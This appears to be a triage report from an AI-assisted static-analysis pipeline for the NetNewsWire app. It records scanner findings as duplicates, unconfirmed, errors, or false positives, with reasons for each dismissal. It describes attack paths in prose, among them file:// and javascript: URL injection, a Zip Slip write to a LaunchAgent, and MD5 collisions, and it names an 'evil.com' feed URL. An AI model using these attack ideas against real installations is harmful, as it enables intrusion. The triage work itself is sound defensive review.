- **[UNCONFIRMED]** `Modules/SyncDatabase/Sources/SyncDatabase/SyncStatusTable.swift:116` injection (spec-batch-etl-07) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `Modules/CloudKitSync/Sources/CloudKitSync/CloudKitZoneResult.swift:34` logic-flaw (spec-batch-etl-49) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `Modules/ErrorLog/Sources/ErrorLog/ErrorLogDatabase.swift:51` injection (spec-batch-etl-50) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `buildscripts/build-local-test.sh:23` other (spec-batch-etl-106) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `scripts/symbolicate_all_crashes.sh:33` injection (spec-batch-etl-140) — s4 confidence 0.52 < gate 0.60
- **[DUP (pre-verify)]** `Shared/Article Rendering/ArticleRenderer.swift:290` injection (chunk-04) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Themes/Promenade.nnwtheme/template.html:37` injection (catchall-108) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Themes/Tiqoe Dark.nnwtheme/template.html:11` injection (catchall-110) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/Article Rendering/ArticleRenderer.swift:243` injection (spec-batch-etl-71) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/ShareExtension/ExtensionFeedAddRequestFile.swift:84` logic-flaw (spec-crypto-84) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/UserNotifications/UserNotificationManager.swift:82` injection (spec-crypto-90) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `buildscripts/fail_on_warnings.sh:28` injection (spec-batch-etl-112) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `buildscripts/gyb.py:719` injection (spec-crypto-113) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `iOS/Settings/ArticleThemeImporter.swift:27` injection (spec-crypto-135) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `iOS/SceneDelegate.swift:109` injection (spec-logic-bug-13) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `iOS/Article/WebViewController.swift:488` injection (spec-logic-bug-13) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/Article Rendering/ArticleRenderer.swift:210` injection (spec-batch-etl-71) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Mac/Scripting/AppDelegate+Scriptability.swift:49` other (spec-access-control-42) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Modules/Account/Sources/Account/Feedly/OAuthAuthorizationCodeGranting.swift:64` logic-flaw (spec-access-control-45) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/ArticleStyles/ArticleTheme.swift:73` injection (spec-access-control-73) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/Extensions/ArticleUtilities.swift:137` injection (spec-batch-etl-80) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Themes/Verdana Revival.nnwtheme/template.html:24` injection (spec-access-control-99) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `scripts/symbolicate_all_crashes.sh:14` injection (spec-access-control-140) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `scripts/symbolicate_crash.sh:103` race-condition (spec-batch-etl-141) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `scripts/symbolicate_crash.sh:71` injection (spec-access-control-141) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Shared/Article Extractor/ArticleExtractor.swift:35` injection (spec-batch-etl-10) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `.github/workflows/ci.yml:4` injection (spec-batch-etl-21) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Modules/FeedFinder/Sources/FeedFinder/FeedFinder.swift:178` other (spec-batch-etl-51) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `Resources/Themes/Appanoose.nnwtheme/template.html:53` injection (spec-batch-etl-63) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `buildscripts/clean_swift_whitespace.sh:2` logic-flaw (spec-batch-etl-109) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `scripts/symbolicate_crash_simple.sh:40` injection (spec-batch-etl-142) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `iOS/Inspector/FeedInspectorViewController.swift:172` other (spec-batch-etl-126) — pre-verify semantic: iOS/Inspector/FeedInspectorViewController.swift:172 SFSafariViewController crash matches index 136 at the same file and line.
- **[FP]** `iOS/Article/WebViewController.swift:488` logic-flaw (taint-07) — `Downloader.swift` line 70 explicitly guards on `isHTTPOrHTTPSURL()` before creating any URLSession task, blocking every non-HTTP(S) scheme the scanner cited (`file://`, `javascript:`, custom schemes); the scanner's core claim of "no scheme allow-list" is wrong.
- **[FP]** `Mac/MainWindow/Detail/DetailWebViewController.swift:261` injection (taint-08) — `URLComponents.path` encoding reliably maps `"` → `%22` and `\` → `%5C` per RFC 3986, making JS string-literal escape impossible; for local feeds `articleID` is always an MD5 hex string, and sync-service IDs are numeric or server-assigned rather than raw attacker-controlled GUIDs.
- **[FP]** `iOS/Article/WebViewController.swift:677` injection (taint-07) — local-feed articleIDs are MD5 hex strings by construction; URLComponents percent-encodes U+2028/U+2029 per RFC 3986; sync-service IDs come from the sync provider's servers, not the RSS publisher
- **[FP]** `Modules/RSWeb/Sources/RSWeb/URLRequest+RSWeb.swift:13` logic-flaw (spec-crypto-60) — `addBasicAuthorization` in URLRequest+RSWeb.swift has zero callers anywhere in the codebase; it is dead code, making the exploit scenario unreachable.
- **[FP]** `Shared/ArticleStyles/ArticleThemeDownloader.swift:54` injection (spec-batch-etl-11) — Zip Slip is real in the Zip library and the code path is reachable, but `com.apple.security.app-sandbox: true` (confirmed in production entitlements) enforces OS-kernel-level write confinement; `fopen` for any path outside the sandbox container returns `nil`, blocking the described LaunchAgent write entirely.
- **[FP]** `Intents/AddWebFeedIntentHandler.swift:29` injection (chunk-05) — `Downloader.swift:70` guards `isHTTPOrHTTPSURL()` before any network call; a `file://` URL causes `FeedFinder` to throw `feedNotFound`, so no subscription is ever persisted and no local file is ever read.
- **[FP]** `Mac/MainWindow/Detail/DetailWebViewController.swift:205` logic-flaw (chunk-03) — production app sandbox (`com.apple.security.app-sandbox: true`, no broad file-read entitlement) blocks arbitrary file reads; WebKit's NetworkProcess sandbox extension from `loadFileURL` covers only the app-bundle blank-page directory, not `~/Downloads` or user Documents; even if the delegate returns `.allow`, the OS kernel refuses the file read; the dev-profile unsandboxed case applies only to developer workstations which are out of scope.
- **[FP]** `Modules/RSParser/Sources/RSParser/XML/XMLScanner.swift:392` other (chunk-06) — The `reserveCapacity(input.count - start)` is a real but linear (O(n)) over-reservation, not unbounded allocation; 2× amplification from a feed that's already fully buffered does not produce exploitable memory pressure on real iOS/macOS devices, and the `scanAttributeValue()` claim in the report is factually wrong.
- **[FP]** `Modules/Account/Sources/Account/CloudKit/CloudKitAccountDelegate.swift:251` logic-flaw (catchall-02) — `validateFeed` is hardcoded to `true` in `ExtensionFeedAddRequestFile.processRequest`; the `addDeadFeed` dead-feed persistence path is unreachable from the Intent entry point, negating the entire exploit scenario
- **[FP]** `Modules/Secrets/Sources/Secrets/CredentialsManager.swift:49` other (catchall-05) — iCloud Keychain sync requires `kSecAttrSynchronizable=kCFBooleanTrue` which is absent from every query; items stay device-local; the scanner misidentified the sync mechanism
- **[FP]** `Modules/RSParser/Sources/RSParser/OPML/OPMLItem.swift:46` injection (chunk-05) — Both attack chains are broken: the `file://` feedURL data is discarded by a mandatory `HTTPURLResponse` cast before any parsing, and the `javascript:` homePageURL is simply never propagated to the Feed object by `newFeed(with:)`, making the WKWebView injection scenario structurally impossible from OPML import.
- **[FP]** `Mac/Inspector/FeedInspectorViewController.swift:66` race-condition (catchall-35) — The TOCTOU code pattern is confirmed but the only actor who can exploit it is the local machine user themselves (no remote entry point, no privilege boundary crossed); the sole impact is a misapplied local notification preference, which is a UI correctness bug outside the security scope.
- **[FP]** `Mac/CrashReporter/CrashReportWindowController.swift:47` info-leak (catchall-30) — PLCrashReporter iOS-format text reports contain register hex addresses, not dereferenced heap-string contents; auto-send requires explicit opt-in (default false); transmission is HTTPS; the cited lines are the interactive manual-send path, not the auto-send path.
- **[FP]** `Mac/Dinosaurs/DinosaursWindowController.swift:140` injection (catchall-32) — `Feed.homePageURL` setter always applies `normalizedURL`, which prepends `http://` to any non-HTTP-scheme string; `file:`, `data:`, and `javascript:` URLs are all rewritten to syntactically-HTTP URLs before reaching `NSWorkspace.open`.
- **[FP]** `Mac/MainWindow/Sidebar/SidebarViewController+ContextualMenus.swift:50` other (catchall-37) — `Feed.homePageURL`'s setter always passes values through `normalizedURL`, which prepends `http://` to any string not already starting with `http`, converting `file://…` to `http://file://…` before it ever reaches the menu or `Browser.open()`; no `file://` URI survives into the sink.
- **[FP]** `Mac/Resources/NetNewsWire-dev.entitlements:5` logic-flaw (catchall-43) — `DEVELOPER_ENTITLEMENTS = -dev` is only active on developer machines that explicitly ran `setup.sh`; the in-repo default is empty, always resolving to the sandboxed production entitlements; production/App Store builds are unaffected; the exploit also requires a second independent code-execution vulnerability.
- **[FP]** `Modules/Account/Sources/Account/Feedly/OAuthAuthorizationCodeGranting.swift:45` logic-flaw (catchall-49) — The OAuth callback is gated inside ASWebAuthenticationSession's private completion handler, which external URLs (deep-links from other apps) cannot reach; SceneDelegate silently drops netnewswire://auth/feedly URLs and has no path to OAuthAuthorizationResponse.
- **[FP]** `Mac/SafariExtension/SafariExtensionHandler.swift:43` injection (catchall-44) — `normalizedURL` unconditionally prepends `http://` to any non-http remainder after stripping the `feed:` prefix, so `feed:file:///…` becomes the harmless `http://file:///…` before reaching `addFeed`; no local file is ever fetched.
- **[FP]** `Modules/Articles/Sources/Articles/Article.swift:56` other (spec-crypto-47) — The MD5 collision mechanism is real, but both colliding feeds must be attacker-owned and user-subscribed; the "INSERT OR REPLACE" also rewrites `feedID`, causing article thrash rather than stable substitution under feed1's identity; no third-party feed is reachable without a second-preimage (~2^128); attacker gains no privilege beyond what they already hold as feed operators.
- **[FP]** `Modules/Articles/Sources/Articles/Author.swift:31` logic-flaw (spec-logic-bug-47) — The collision defect is real but provides zero additional attack capability; any feed can already spoof any author name directly without needing a collision; no data exposure/auth bypass/code execution is possible.
- **[FP]** `Modules/RSCore/Sources/RSCore/BinaryDiskCache.swift:83` injection (catchall-60) — all three callers consistently use `url.md5String` (a 32-char hex string, alphabet `[0-9a-f]`) as the cache key; no caller passes a raw URL or feed-controlled string, so path traversal via `..` is structurally impossible regardless of the sink's lack of sanitization
- **[FP]** `Modules/NewsBlur/Sources/NewsBlur/NewsBlurAPICaller+Internal.swift:100` logic-flaw (spec-crypto-54) — `asData` cannot return nil for real story hash strings (standard `percentEncodedQuery` on a set queryItems is always non-nil); even hypothetically, a failed sync is a reliability bug not a security vulnerability, and no external attacker controls the payload.
- **[FP]** `Modules/RSTree/Sources/RSTree/TreeController.swift:102` other (spec-batch-etl-59) — The scanner's claimed entry point (`application(_:openFile:)`) explicitly rejects non-`.nnwtheme` files; there is no OS-level OPML file association; OPML import is reachable only via an explicit multi-step user action, not by social-engineering a file open. The recursive functions are real but unexploitable from a lower-privileged external actor.
- **[FP]** `Modules/RSParser/Sources/RSParser/HTML/HTMLMetadata.swift:159` logic-flaw (catchall-63) — the "bypass" offers no capability beyond directly writing `https://evil.com/feed.rss` in the href; the filter's sole intent is scheme-class exclusion, and protocol-relative URLs correctly resolve to https: — the allowed scheme.
- **[FP]** `Shared/Activity/ActivityManager.swift:201` logic-flaw (spec-logic-bug-66) — the first `updateReadArticleSearchAttributes` call at line 222 is confirmed dead code (no-op via nil optional chain), but the second call at line 109 keeps current behaviour correct; no attacker-reachable path and no security impact even in the described future-refactor scenario
- **[FP]** `Modules/SyncDatabase/Sources/SyncDatabase/SyncDatabase.swift:52` race-condition (catchall-67) — the exploit scenario requires `resetAllSelectedForProcessing()` to precede `selectForProcessing()` in an error-recovery path, but the actual error handler calls `resetSelectedForProcessing` (scoped) and throws; no code path places the two calls back-to-back; the only call site is one-time account initialization
- **[FP]** `Shared/Extensions/ArticleUtilities.swift:154` injection (catchall-89) — The scanner mis-identified the call chain: `Article.byline()` in ArticleUtilities.swift is used exclusively in native UILabel/NSTextField; the HTML renderer has a separate `ArticleRenderer.byline()` with `&lt;`/`&gt;` escaping that the scanner did not examine.
- **[FP]** `Shared/ShareExtension/ExtensionFeedAddRequestFile.swift:94` logic-flaw (catchall-96) — `save()` is only reachable from the device owner's own Share Extension or Siri Intents process; no external attacker can write to another user's App Group container; the scenario is self-inflicted resource exhaustion with no data exposure or auth bypass
- **[FP]** `Shared/UserNotifications/UserNotificationManager.swift:66` injection (catchall-102) — OS notification chrome always attributes the notification to NetNewsWire (not a spoofable system alert); user must double-opt-in (subscribe + enable per-feed notifications, which default to off); HTML is stripped; this is intended RSS-reader behaviour, not an injection vulnerability
- **[FP]** `Themes/Hyperlegible.nnwtheme/Info.plist:10` other (spec-access-control-94) — The `CreatorHomePage` URL is handed off to the OS browser via `UIApplication.shared.open()` / AppKit link attribute; the app itself never fetches or processes any HTTP response from this URL, so no in-app MITM surface exists.
- **[FP]** `Themes/Appanoose.nnwtheme/template.html:13` logic-flaw (catchall-104) — The `startsWith` logic error is real and both guards are bypassable by a feed author, but the sole effect is hiding a cosmetic footer indicator; the attacker gains no capability beyond what arbitrary feed `contentHTML` already provides, and there is no path to data exposure, auth bypass, or code execution.
- **[FP]** `buildscripts/ci-build.sh:40` injection (catchall-123) — `ci-build.sh` is dead code with zero callers in the repo; the live CI workflow (`ci.yml`) never invokes it and uses hardcoded scheme literals directly.
- **[FP]** `Widget/Shared Views/ArticleItemView.swift:56` other (catchall-116) — `feedIconPath` is always constructed as `<app-group-container>/widgetImages/<md5-hex-digest>` by `writeImageDataToSharedContainer()`; the 32-char hex filename (`[0-9a-f]` only) cannot contain path traversal sequences, so no file outside the `widgetImages/` subdirectory can be reached regardless of feed content.
- **[FP]** `buildscripts/ci-build.sh:23` injection (spec-batch-etl-108) — `ci-build.sh` has zero callers in the repo and is never invoked by the current `.github/workflows/ci.yml`; the code is unreachable dead script, so no external entry point exists.
- **[FP]** `buildscripts/ci-build.sh:19` other (spec-crypto-108) — `ci-build.sh` is dead code: no workflow or script invokes it, confirmed by a repo-wide grep returning zero matches; the vulnerable keychain is never created in any CI job.
- **[FP]** `buildscripts/crash-logs.sh:4` injection (catchall-126) — The exploit requires same-user code execution as a precondition, which already grants the attacker direct read access to `~/.ssh/id_rsa`; no privilege boundary is crossed, and the script is developer-only build tooling never exposed to untrusted input.
- **[FP]** `buildscripts/clean_swift_whitespace.sh:21` logic-flaw (catchall-124) — `((file_count++))` under `set -e` does not cause premature exit in bash 3.2 (macOS system bash); empirically verified. The script also has no CI integration and no security impact.
- **[FP]** `buildscripts/old_buildnnw:30` injection (catchall-130) — `old_buildnnw` is dead code with zero references anywhere in the repo or CI pipeline; the path traversal is real in the code but has no reachable execution surface, and the scanner's specific example payload is technically incorrect
- **[FP]** `buildscripts/fail_on_warnings.sh:19` injection (catchall-127) — the `exit 1` is unconditional and makes the "false green build" impact impossible regardless of runner version; additionally, `macos-26` runners use a patched Actions runner (post-v2.168.0) that does not URL-decode `%0A` in workflow command payloads, so even the annotation-injection mechanism does not activate
- **[FP]** `buildscripts/updateSecrets.sh:5` injection (spec-access-control-115) — The CI workflow hardcodes `PROJECT_DIR="$GITHUB_WORKSPACE"` as an inline shell prefix assignment overriding any env-block injection; additionally, GitHub Actions `pull_request` triggers use the base branch's workflow file, preventing fork PRs from modifying the workflow to introduce the `env:` override the scanner requires.
- **[FP]** `iOS/AccountStats/AccountStatsView.swift:162` logic-flaw (catchall-134) — The race window is real but exploitable only by the legitimate device owner tapping their own button twice in a sub-second window; SQLite locking and Swift's main-actor serialisation prevent data corruption; zero security impact (no exposure, no auth bypass, no execution of attacker-controlled code).
- **[FP]** `iOS/Add/AddFeedViewController.swift:87` logic-flaw (catchall-135) — The force-unwrap crash is real but impact is crash-only with no data exposure/auth bypass; the scanner's stale-container exploit path is factually wrong (defaultContainer uses live activeAccounts); fits the "null deref that doesn't expose data or grant access" out-of-scope rule.
- **[FP]** `iOS/Inspector/AccountInspectorViewController.swift:115` logic-flaw (catchall-144) — The code matches the scanner's description, but this is a UX/usability defect (accidental self-deletion via keyboard shortcut), not a security vulnerability; no external attacker can reach this path, and the only potential victim is the legitimate device owner acting on their own data.
- **[FP]** `iOS/Resources/page.html:3` injection (catchall-150) — `ArticleStringFormatter.sanitizedTitle(_:forHTML:true)` escapes all disallowed tags (including `</title>` and `<script>`) to `&lt;…&gt;` entities before substitution; the HTML `<title>` RCDATA parser cannot interpret those entities as tag boundaries, so the injection is fully blocked.
- **[FP]** `iOS/Resources/page.html:17` injection (spec-access-control-132) — The scanner's assumption that `<base href>` redirects the three bundled scripts is wrong on two independent grounds: (1) the `<base>` element appears after the `<script>` elements so it cannot affect their URL resolution, and (2) those scripts are injected by WKUserScript from the app bundle before the HTML even starts parsing — the `<script src>` attributes in page.html are never the actual mechanism for loading them.
- **[FP]** `iOS/ShareExtension/ShareViewController.swift:96` logic-flaw (catchall-154) — the missing `return` is a genuine logic bug but causes only a dropped feed-subscription request (functional loss); there is no data exposure, auth bypass, or code execution path, and the scanner's own description confirms UX-only impact
- **[FP]** `iOS/MainFeed/MainFeedCollectionViewController.swift:1048` injection (spec-batch-etl-129) — `Feed.homePageURL`'s setter unconditionally passes every stored URL through `normalizedURL`, which prepends `http://` to any string not starting with "http", converting `tel:`, `facetime:`, `itms-apps:`, and similar schemes into harmless HTTP URLs before they are ever read back by `homePageAction`.
- **[FP]** `scripts/symbolicate_crash.sh:133` race-condition (catchall-161) — developer-only tooling script; attacker requires local shell access on the same machine (out-of-scope rule A); worst-case impact is misdirected crash symbolication with no data exposure, privilege escalation, or code execution
- **[FP]** `scripts/symbolicate_all_crashes.sh:26` injection (catchall-160) — Script is a developer-only workstation tool (out-of-scope per category A); even in scope, terminal escape injection here has no path to code execution, data exposure, or auth bypass (noise floor per category E).
- **[FP]** `scripts/check_localization_comments.py:35` other (catchall-157) — The script is not wired into CI (zero callers found repo-wide; `ci.yml` does not reference it), and the scanner misread the regex: group 3 in the actual code does include a closing `"`, invalidating the specific exploit scenario described.
- **[FP]** `scripts/symbolicate_crash_simple.sh:73` injection (catchall-162) — The described "wrong archive selected" impact is incorrect: the bash `[[ ]]` glob quotes `$APP_NAME` literally so metacharacters don't expand; the actual outcome is a clean exit-1 error. Additionally, this is a developer-local build tooling script, squarely within the "tooling scripts run only on a developer's own workstation" out-of-scope rule.
- **[FP]** `xcconfig/NetNewsWire_iOSapp_target.xcconfig:7` other (catchall-166) — the only alternate entitlements file (`-dev`) contains a strict subset of the production entitlements (no push, no iCloud), and CI builds disable code signing entirely via `CODE_SIGNING_ALLOWED = NO`; neither precondition for impact is met.
- **[FP]** `scripts/symbolicate_crash_simple.sh:109` injection (catchall-162) — Developer-only crash symbolication script; even with successful glob injection, the worst outcome is wrong symbolication output text with zero code execution, data exfiltration, or privilege escalation — no meaningful security impact, and squarely within the "build/tooling scripts run only on a developer's own workstation" and "no security impact" exclusions.
- **[FP]** `Shared/Article Rendering/WebViewConfiguration.swift:39` logic-flaw (spec-crypto-09) — The race condition is real code, but ContentRules.json only blocks ~37 known ad/tracker domains; an attacker's own infrastructure is never on the blocklist, so no attacker-controlled content is ever "unblocked" by the race. The actual impact is that known ad-tracker requests may fire briefly on first cold launch — a privacy nuisance, not a security boundary bypass.
- **[FP]** `Shared/Article Extractor/ArticleExtractor.swift:39` other (spec-crypto-10) — `mercuryClientSecret` is never transmitted; the URL format is Feedbin's own API contract; replay requires prior Feedbin server log access; and HMAC-SHA1 remains secure for authentication uses.
- **[FP]** `Mac/CrashReporter/CrashReporter.swift:52` injection (spec-crypto-12) — exploit requires an undemonstrated crash bug to inject the exact boundary into an exception message, and impact is limited to telemetry manipulation on the developer's own server with no user data exposure or system compromise
- **[FP]** `Mac/MainWindow/AddFeed/AddFeedWindowController.swift:93` logic-flaw (spec-crypto-14) — scanner incorrectly described `normalizedURL` as scheme-preserving; it prepends `http://` to any input not starting with `"http"`, so `file://` URLs are rewritten to a broken HTTP URL and never reach the filesystem
- **[FP]** `iOS/Account/FeedbinAccountViewController.swift:85` logic-flaw (spec-crypto-19) — The bypass path via `textFieldShouldReturn` is real and the isEmpty check is genuinely missing, but the sole outcome is a server-rejected network request and a user error dialog; no auth bypass, no data exposure, no meaningful security impact.
- **[FP]** `Intents/AddWebFeedIntentHandler.swift:29` logic-flaw (spec-batch-etl-22) — The `Downloader.isHTTPOrHTTPSURL()` guard (line 70) blocks the `file://` exfiltration scenario entirely; the residual http:// blind-GET SSRF has no attacker-side data-exfiltration path and does not match the described impact.
- **[FP]** `Mac/Dinosaurs/DinosaursWindowController.swift:140` logic-flaw (spec-crypto-30) — `Feed.homePageURL`'s setter unconditionally passes the value through `normalizedURL`, which prepends `http://` to any non-http(s) URL, neutralizing all custom URL-scheme injections before the value ever reaches the Dinosaurs window or `NSWorkspace.open`.
- **[FP]** `Modules/FeedFinder/Sources/FeedFinder/FeedFinder.swift:163` logic-flaw (spec-crypto-51) — Every caller of `FeedFinder.find()` subsequently calls `InitialFeedDownloader.download()` / `downloadAndParseFeed()` and guards on a non-nil `ParsedFeed` before creating the subscription; HTMLHead URLs that don't serve parseable feed content are rejected, so no persistent subscription to an unverified tracking endpoint is possible.
- **[FP]** `Modules/HTMLMetadata/Sources/HTMLMetadata/HTMLMetadataDownloader.swift:104` injection (spec-crypto-52) — `Downloader.download()` line 70 explicitly rejects all non-HTTP/HTTPS URLs before any URLSession request; no file:// access occurs and no path-leaking error is generated.
- **[FP]** `Modules/Articles/Sources/Articles/Author.swift:31` other (spec-crypto-47) — AuthorCache is a memory-deduplication optimisation with no security semantics; attacker-controlled author-name spoofing is already possible by directly writing any name into the feed, making MD5 collision an elaborate path to an outcome achievable trivially; moreover MD5 chosen-prefix collision bytes are unlikely to survive XML/JSON validation in real feeds.
- **[FP]** `Modules/NewsBlur/Sources/NewsBlur/Models/NewsBlurStoryHash.swift:71` logic-flaw (spec-logic-bug-54) — The `StoryHash.timestamp` field decoded via `extractArray` is never consumed by any downstream logic (sync functions use only `.hash`), so corrupting it has no effect; exploitation of the secondary `datePublished` path requires server compromise or trusted-cert MITM and yields only UX disruption, not a security impact.
- **[FP]** `Modules/RSCore/Sources/RSCore/String+RSCore.swift:29` other (spec-crypto-55) — The only production caller uses HMAC-SHA1 to authenticate requests to Feedbin's article-text extractor service with an app-level shared secret, not OAuth 1.0 per-user credentials; the described exploit scenario (forging user auth to read subscriptions/credentials) is entirely wrong for this API and has no practical attack path.
- **[FP]** `Modules/Images/Sources/Images/ImageDownloader.swift:194` other (spec-crypto-53) — MD5 cache-key collision is theoretically constructible but requires days of GPU compute (not "seconds-to-minutes" as claimed), the in-memory cache provides session-level protection, and the maximum achievable impact is displaying a wrong favicon icon — no data exposure, auth bypass, or code execution path exists.
- **[FP]** `Modules/Secrets/Sources/Secrets/Credentials.swift:66` logic-flaw (spec-crypto-61) — `Credentials.==` is never invoked in production code; all `credentials ==` usages are nil-checks on `Optional<Credentials>` that never reach the struct's own synthesized equality operator, so the timing-oracle precondition cannot be met.
- **[FP]** `Shared/UserNotifications/UserNotificationManager.swift:58` injection (spec-crypto-90) — Scanner incorrectly assumed `<guid>` is stored verbatim as `articleID`; the actual ID is `md5(feedURL + " " + guid)`, making cross-feed identifier collision computationally infeasible
- **[FP]** `Shared/ExtensionPoints/SendToMicroBlogCommand.swift:46` injection (spec-logic-bug-79) — harm requires Micro.blog's WKWebView to allow `javascript:` navigation (blocked by default on macOS) plus two separate deliberate user actions; NetNewsWire is functioning as designed passing article content to a partner app, and final exploitation would require a pre-existing vulnerability in that third-party app's WebView
- **[FP]** `Themes/Appanoose.nnwtheme/template.html:27` injection (spec-crypto-92) — `avatar_src` is not the raw feed icon URL; it is a synthetically constructed `nnwImageIcon://articleID` URL built with `URLComponents` (which percent-encodes any special characters), making the described attribute-breakout injection impossible.
- **[FP]** `Shared/Widget/WidgetDataEncoder.swift:160` logic-flaw (spec-crypto-91) — The collision mechanic is real but the maximum impact is cosmetic favicon substitution in the iOS widget with no data exposure, auth bypass, or code execution; falls under noise-floor category E
- **[FP]** `scripts/symbolicate_crash.sh:16` injection (spec-crypto-141) — Developer-only tooling script never executed in CI/CD or production; the impact is purely cosmetic terminal manipulation with no data exfiltration, auth bypass, or code execution, and the crash output is written to a persistent file unaffected by any terminal trickery (Scope Rules A + E)
- **[FP]** `iOS/Inspector/FeedInspectorViewController.swift:172` logic-flaw (spec-crypto-126) — `normalizedURL` in `Feed.homePageURL.set` prepends `http://` to any non-http/https value, causing `URL(string:)` to return nil for all dangerous schemes and preventing `SFSafariViewController` from being reached.
- **[FP]** `Modules/RSParser/Sources/RSParser/Feeds/XML/AtomParser.swift:329` logic-flaw (spec-logic-bug-02) — The code bug is confirmed but provides no incremental attack capability; an attacker controlling a subscribed feed can already set arbitrary author names via the standard `<entry><author>` path without triggering this flaw
- **[FP]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/ArticlesTable.swift:686` logic-flaw (spec-logic-bug-04) — `ArticleStatus` is a `final class`; `StatusesTable.mark()` mutates the shared instance in-place, so the cached `Article` in `articlesCache` always observes the current `starred` value through the live reference. No stale copy exists.
- **[FP]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/ArticlesTable.swift:231` logic-flaw (spec-logic-bug-04) — The age-bucketing behaviour is explicitly intentional (code comment confirms), only affects articles never previously seen, and the "attacker" (feed operator) already controls all content delivered to subscribers — no meaningful security boundary is crossed.
- **[FP]** `Modules/Images/Sources/Images/FeedIconURLTable.swift:40` logic-flaw (spec-logic-bug-08) — `ImageDownloader.image(for:)` enforces an explicit `http://`/`https://`-only allow-list before any fetch; `file://` URLs are rejected without download, and `FeedIconURLTable.save` is only reachable after a successful HTTP/HTTPS image download completes.
- **[VERIFY-ERR]** `Shared/Article Extractor/ArticleExtractor.swift:107` logic-flaw (spec-logic-bug-10) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/AppDelegate.swift:897` race-condition (spec-logic-bug-12) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Shared/Article Extractor/ArticleExtractor.swift:43` injection (spec-logic-bug-10) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/MainWindow/AddFeed/AddFeedController.swift:64` race-condition (spec-logic-bug-14) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Mac/MainWindow/MainWindowController.swift:747` race-condition (spec-logic-bug-15) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Account/Sources/Account/ReaderAPI/ReaderAPIAccountDelegate.swift:131` logic-flaw (spec-logic-bug-16) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Account/Sources/Account/ReaderAPI/ReaderAPIAccountDelegate.swift:810` logic-flaw (spec-logic-bug-16) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Account/Sources/Account/Feedly/OAuthAccountAuthorizationOperation.swift:221` logic-flaw (spec-logic-bug-17) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `Modules/Account/Sources/Account/Feedly/OAuthAccountAuthorizationOperation.swift:143` race-condition (spec-logic-bug-17) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `iOS/Account/FeedbinAccountViewController.swift:93` race-condition (spec-logic-bug-19) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
- **[VERIFY-ERR]** `.github/workflows/ci.yml:40` injection (spec-logic-bug-21) — claude CLI agentic failed (rc=1) cmd: /Users/mihaiarosoaie/.local/bin/claude -p --model claude-sonnet-4-6 --effort high --system-prompt You are the second-opinion reviewer in a SAST pipeline. A sc...<
